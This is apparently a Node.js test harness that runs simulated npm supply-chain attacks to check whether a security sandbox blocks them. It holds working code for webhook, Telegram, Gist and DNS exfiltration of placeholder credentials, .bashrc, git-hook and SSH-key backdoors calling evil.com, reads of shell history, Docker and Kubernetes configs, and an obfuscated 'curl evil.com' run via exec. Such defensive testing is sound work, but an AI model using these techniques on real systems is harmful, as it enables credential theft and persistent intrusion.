#!/usr/bin/env node

/**
 * Advanced Supply Chain Attack Tests
 * Based on real-world npm attacks (2017-2024)
 * 
 * Tests sophisticated evasion techniques and modern attack vectors
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');
const https = require('https');
const http = require('http');

const results = {
  advanced: [],
  stats: { total: 0, blocked: 0, succeeded: 0 }
};

console.log('\n╔╗');
console.log('     ADVANCED SUPPLY CHAIN ATTACK TESTS                    ');
console.log('  Based on Real npm Incidents (2017-2024)                  ');
console.log('╚╝\n');

function runTest(name, description, testFn) {
  return new Promise(async (resolve) => {
    console.log(`\n[${'='.repeat(60)}]`);
    console.log(`Test: ${name}`);
    console.log(`Description: ${description}`);
    console.log(`${''.repeat(62)}`);
    
    try {
      const result = await testFn();
      const status = result.blocked ? ' BLOCKED' : ' SUCCEEDED';
      const color = result.blocked ? '\x1b[32m' : '\x1b[31m';
      
      console.log(`${color}${status}\x1b[0m`);
      if (result.details) {
        console.log(`Details: ${result.details}`);
      }
      if (result.recommendation) {
        console.log(` Recommendation: ${result.recommendation}`);
      }
      
      results.advanced.push({
        test: name,
        description,
        blocked: result.blocked,
        details: result.details,
        recommendation: result.recommendation
      });
      
      results.stats.total++;
      if (result.blocked) {
        results.stats.blocked++;
      } else {
        results.stats.succeeded++;
      }
    } catch (e) {
      console.log(`❓ ERROR: ${e.message}`);
      results.advanced.push({
        test: name,
        description,
        error: true,
        details: e.message
      });
      results.stats.total++;
    }
    
    resolve();
  });
}

// ==========================================
// MODERN EXFILTRATION TECHNIQUES
// ==========================================

async function testDiscordWebhook() {
  return runTest('DISCORD_WEBHOOK', 'Discord webhook exfiltration (real attack vector)', () => {
    return new Promise((resolve) => {
      try {
        const data = JSON.stringify({
          content: 'Stolen credentials: ' + JSON.stringify({
            npmToken: 'npm_fake_token',
            awsKey: 'AKIA_FAKE_KEY'
          })
        });
        
        const req = https.request({
          hostname: 'discord.com',
          port: 443,
          path: '/api/webhooks/123456/fake-webhook',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
          }
        }, (res) => {
          resolve({ 
            blocked: false, 
            details: 'Successfully sent data to Discord webhook',
            recommendation: 'Add discord.com/api/webhooks to blockedDomains'
          });
        });
        
        req.on('error', (e) => {
          resolve({ blocked: true, details: `Blocked: ${e.message}` });
        });
        
        req.setTimeout(3000, () => {
          req.destroy();
          resolve({ blocked: true, details: 'Timeout/Blocked' });
        });
        
        req.write(data);
        req.end();
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

async function testTelegramBot() {
  return runTest('TELEGRAM_BOT_API', 'Telegram bot API upload (common in 2023 attacks)', () => {
    return new Promise((resolve) => {
      try {
        const data = JSON.stringify({
          chat_id: '123456',
          text: 'Credentials: ~/.npmrc contents here'
        });
        
        const req = https.request({
          hostname: 'api.telegram.org',
          port: 443,
          path: '/bot123456:fake-token/sendMessage',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        }, (res) => {
          resolve({ 
            blocked: false, 
            details: 'Successfully sent to Telegram bot',
            recommendation: 'Add api.telegram.org/bot to blockedDomains'
          });
        });
        
        req.on('error', (e) => {
          resolve({ blocked: true, details: `Blocked: ${e.message}` });
        });
        
        req.setTimeout(3000, () => {
          req.destroy();
          resolve({ blocked: true, details: 'Timeout/Blocked' });
        });
        
        req.write(data);
        req.end();
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

async function testGitHubGist() {
  return runTest('GITHUB_GIST_UPLOAD', 'GitHub Gist upload (used in Shai-Hulud)', () => {
    return new Promise((resolve) => {
      try {
        const data = JSON.stringify({
          files: {
            'stolen-creds.txt': {
              content: 'AWS_KEY=fake\nNPM_TOKEN=fake'
            }
          },
          public: false
        });
        
        const req = https.request({
          hostname: 'api.github.com',
          port: 443,
          path: '/gists',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'node',
            'Authorization': 'token ghp_faketoken'
          }
        }, (res) => {
          resolve({ 
            blocked: false, 
            details: 'Successfully created Gist',
            recommendation: 'Add api.github.com/gists to monitored paths'
          });
        });
        
        req.on('error', (e) => {
          resolve({ blocked: true, details: `Blocked: ${e.message}` });
        });
        
        req.setTimeout(3000, () => {
          req.destroy();
          resolve({ blocked: true, details: 'Timeout/Blocked' });
        });
        
        req.write(data);
        req.end();
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

// ==========================================
// PERSISTENCE MECHANISMS
// ==========================================

async function testBashrcInjection() {
  return runTest('BASHRC_INJECTION', 'Inject backdoor into .bashrc (persistence)', async () => {
    try {
      const bashrcPath = path.join(os.homedir(), '.bashrc');
      const backdoor = '\n# Malicious backdoor\ncurl -s evil.com/beacon | bash\n';
      
      // Try to append to .bashrc
      fs.appendFileSync(bashrcPath, backdoor);
      
      // Cleanup
      try {
        const content = fs.readFileSync(bashrcPath, 'utf8');
        fs.writeFileSync(bashrcPath, content.replace(backdoor, ''));
      } catch (e) {}
      
      return { 
        blocked: false, 
        details: 'Successfully injected into .bashrc',
        recommendation: 'Add ~/.bashrc, ~/.zshrc to blockedWritePaths'
      };
    } catch (e) {
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

async function testGitHookInjection() {
  return runTest('GIT_HOOK_INJECTION', 'Inject malicious git pre-commit hook', async () => {
    try {
      const hookPath = path.join(process.cwd(), '.git', 'hooks', 'pre-commit');
      const maliciousHook = '#!/bin/bash\ncurl -s evil.com/exfiltrate -d "$(git diff)" \n';
      
      fs.mkdirSync(path.dirname(hookPath), { recursive: true });
      fs.writeFileSync(hookPath, maliciousHook, { mode: 0o755 });
      
      // Cleanup
      try { fs.unlinkSync(hookPath); } catch (e) {}
      
      return { 
        blocked: false, 
        details: 'Successfully created git hook',
        recommendation: 'Add .git/hooks/ to blockedWritePaths'
      };
    } catch (e) {
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

async function testSSHAuthorizedKeys() {
  return runTest('SSH_AUTHORIZED_KEYS', 'Add attacker SSH key (remote access)', async () => {
    try {
      const keysPath = path.join(os.homedir(), '.ssh', 'authorized_keys');
      const attackerKey = 'ssh-rsa AAAAB3NzaC1... attacker@evil.com\n';
      
      fs.appendFileSync(keysPath, attackerKey);
      
      // Cleanup
      try {
        const content = fs.readFileSync(keysPath, 'utf8');
        fs.writeFileSync(keysPath, content.replace(attackerKey, ''));
      } catch (e) {}
      
      return { 
        blocked: false, 
        details: 'Successfully added SSH key',
        recommendation: 'Add ~/.ssh/authorized_keys to blockedWritePaths'
      };
    } catch (e) {
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

// ==========================================
// ADVANCED EVASION TECHNIQUES
// ==========================================

async function testEnvironmentVariableScraping() {
  return runTest('ENV_VAR_SCRAPING', 'Extract secrets from process.env', async () => {
    try {
      const secrets = {};
      const sensitiveKeys = ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID', 'API_KEY', 'SECRET'];
      
      for (const key in process.env) {
        if (sensitiveKeys.some(s => key.includes(s))) {
          secrets[key] = process.env[key];
        }
      }
      
      if (Object.keys(secrets).length > 0) {
        return { 
          blocked: false, 
          details: `Found ${Object.keys(secrets).length} potential secrets in env`,
          recommendation: 'Monitor process.env access patterns'
        };
      }
      
      return { 
        blocked: true, 
        details: 'No secrets found in environment'
      };
    } catch (e) {
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

async function testBashHistoryScraping() {
  return runTest('BASH_HISTORY_SCRAPING', 'Read bash history for secrets', async () => {
    try {
      const historyPath = path.join(os.homedir(), '.bash_history');
      const content = fs.readFileSync(historyPath, 'utf8');
      
      // Look for secrets in history
      const secrets = [];
      const patterns = ['export.*TOKEN', 'export.*KEY', 'export.*SECRET', 'export.*PASSWORD'];
      
      patterns.forEach(pattern => {
        const matches = content.match(new RegExp(pattern, 'gi'));
        if (matches) secrets.push(...matches);
      });
      
      return { 
        blocked: false, 
        details: `Read bash history (${content.length} bytes)`,
        recommendation: 'Add ~/.bash_history, ~/.zsh_history to blockedReadPaths'
      };
    } catch (e) {
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

async function testDockerConfigTheft() {
  return runTest('DOCKER_CONFIG_THEFT', 'Steal Docker Hub credentials', async () => {
    try {
      const dockerConfig = path.join(os.homedir(), '.docker', 'config.json');
      const content = fs.readFileSync(dockerConfig, 'utf8');
      
      return { 
        blocked: false, 
        details: 'Successfully read Docker config',
        recommendation: 'Add ~/.docker/ to blockedReadPaths'
      };
    } catch (e) {
      if (e.code === 'ENOENT') {
        return { blocked: true, details: 'File does not exist' };
      }
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

async function testKubernetesConfigTheft() {
  return runTest('KUBERNETES_CONFIG_THEFT', 'Steal kubectl config', async () => {
    try {
      const kubeConfig = path.join(os.homedir(), '.kube', 'config');
      const content = fs.readFileSync(kubeConfig, 'utf8');
      
      return { 
        blocked: false, 
        details: 'Successfully read Kubernetes config',
        recommendation: 'Add ~/.kube/ to blockedReadPaths'
      };
    } catch (e) {
      if (e.code === 'ENOENT') {
        return { blocked: true, details: 'File does not exist' };
      }
      return { blocked: true, details: `Blocked: ${e.message}` };
    }
  });
}

// ==========================================
// OBFUSCATION & ANTI-DETECTION
// ==========================================

async function testBase64MultiLayer() {
  return runTest('BASE64_MULTI_LAYER', 'Multi-layer base64 obfuscation', () => {
    return new Promise((resolve) => {
      try {
        // Triple-encoded malicious command
        const cmd = 'Y3VybCBldmlsLmNvbQ=='; // "curl evil.com" base64
        const doubleEncoded = Buffer.from(cmd).toString('base64');
        const tripleEncoded = Buffer.from(doubleEncoded).toString('base64');
        
        // Decode and execute
        const decoded = Buffer.from(tripleEncoded, 'base64').toString();
        const doubleDecoded = Buffer.from(decoded, 'base64').toString();
        const final = Buffer.from(doubleDecoded, 'base64').toString();
        
        exec(final, (error) => {
          if (error) {
            resolve({ blocked: true, details: `Blocked: ${error.message}` });
          } else {
            resolve({ 
              blocked: false, 
              details: 'Successfully executed obfuscated command',
              recommendation: 'Enhance pattern detection for nested encoding'
            });
          }
        });
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

async function testHexEncodedExfiltration() {
  return runTest('HEX_ENCODED_EXFILTRATION', 'Hex-encoded data exfiltration', () => {
    return new Promise((resolve) => {
      try {
        // Hex encode the domain to evade simple string matching
        const domain = Buffer.from('pastebin.com').toString('hex');
        const decodedDomain = Buffer.from(domain, 'hex').toString();
        
        const req = https.request({
          hostname: decodedDomain,
          port: 443,
          path: '/',
          method: 'GET'
        }, (res) => {
          resolve({ 
            blocked: false, 
            details: 'Hex encoding bypassed domain blocking',
            recommendation: 'Decode hex/base64 before checking domains'
          });
        });
        
        req.on('error', (e) => {
          resolve({ blocked: true, details: `Blocked: ${e.message}` });
        });
        
        req.setTimeout(3000, () => {
          req.destroy();
          resolve({ blocked: true, details: 'Timeout/Blocked' });
        });
        
        req.end();
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

// ==========================================
// DNS TUNNELING
// ==========================================

async function testDNSTunneling() {
  return runTest('DNS_TUNNELING', 'Exfiltrate data via DNS queries', () => {
    return new Promise((resolve) => {
      try {
        const dns = require('dns');
        
        // Encode stolen data in subdomain
        const stolenData = Buffer.from('SECRET_KEY=fake123').toString('base64').replace(/=/g, '');
        const maliciousDomain = `${stolenData}.evil.com`;
        
        dns.resolve4(maliciousDomain, (err) => {
          if (err) {
            resolve({ blocked: true, details: 'DNS query failed (likely blocked or domain not real)' });
          } else {
            resolve({ 
              blocked: false, 
              details: 'Data exfiltrated via DNS',
              recommendation: 'Monitor suspicious DNS patterns'
            });
          }
        });
        
        setTimeout(() => {
          resolve({ blocked: true, details: 'DNS timeout' });
        }, 3000);
      } catch (e) {
        resolve({ blocked: true, details: `Blocked: ${e.message}` });
      }
    });
  });
}

// ==========================================
// RUN ALL TESTS
// ==========================================

async function runAllTests() {
  console.log('Starting advanced attack tests...\n');
  
  // Modern Exfiltration
  console.log('\n╔╗');
  console.log('          MODERN EXFILTRATION TECHNIQUES                    ');
  console.log('╚╝');
  
  await testDiscordWebhook();
  await testTelegramBot();
  await testGitHubGist();
  
  // Persistence
  console.log('\n\n╔╗');
  console.log('            PERSISTENCE MECHANISMS                          ');
  console.log('╚╝');
  
  await testBashrcInjection();
  await testGitHookInjection();
  await testSSHAuthorizedKeys();
  
  // Advanced Theft
  console.log('\n\n╔╗');
  console.log('           ADVANCED CREDENTIAL THEFT                        ');
  console.log('╚╝');
  
  await testEnvironmentVariableScraping();
  await testBashHistoryScraping();
  await testDockerConfigTheft();
  await testKubernetesConfigTheft();
  
  // Evasion
  console.log('\n\n╔╗');
  console.log('        OBFUSCATION & ANTI-DETECTION                        ');
  console.log('╚╝');
  
  await testBase64MultiLayer();
  await testHexEncodedExfiltration();
  await testDNSTunneling();
  
  // Generate summary
  generateSummary();
}

function generateSummary() {
  console.log('\n\n');
  console.log(''.repeat(64));
  console.log('              ADVANCED TESTS - FINAL SUMMARY');
  console.log(''.repeat(64));
  console.log('');
  
  const { total, blocked, succeeded } = results.stats;
  const rate = Math.round((blocked / total) * 100);
  
  console.log(`Total Advanced Tests:  ${total}`);
  console.log(`Blocked:               ${blocked} `);
  console.log(`Succeeded:             ${succeeded} `);
  console.log(`Protection Rate:       ${rate}%`);
  console.log('');
  
  // Grade
  let grade;
  if (rate >= 90) grade = 'A - EXCELLENT';
  else if (rate >= 75) grade = 'B - GOOD';
  else if (rate >= 60) grade = 'C - MODERATE';
  else grade = 'D - NEEDS IMPROVEMENT';
  
  console.log(`Grade:                 ${grade}`);
  console.log('');
  
  // Failures
  const failures = results.advanced.filter(t => !t.blocked && !t.error);
  
  if (failures.length === 0) {
    console.log(' All advanced attacks blocked! Excellent security posture.');
  } else {
    console.log(''.repeat(64));
    console.log('  ADVANCED ATTACKS THAT SUCCEEDED (REQUIRE MITIGATION)');
    console.log(''.repeat(64));
    console.log('');
    
    failures.forEach((failure, idx) => {
      console.log(`${idx + 1}. ${failure.test}`);
      console.log(`   Description: ${failure.description}`);
      console.log(`   Status: ${failure.details}`);
      if (failure.recommendation) {
        console.log(`    Fix: ${failure.recommendation}`);
      }
      console.log('');
    });
  }
  
  // Save report
  try {
    fs.writeFileSync('advanced-attack-report.json', JSON.stringify(results, null, 2));
    console.log('📄 Detailed report saved to: advanced-attack-report.json\n');
  } catch (e) {
    console.error('Failed to save report:', e.message);
  }
  
  console.log(''.repeat(64));
  console.log('               ADVANCED TEST COMPLETE');
  console.log(''.repeat(64));
  console.log('');
}

// Run tests
runAllTests().catch(console.error);
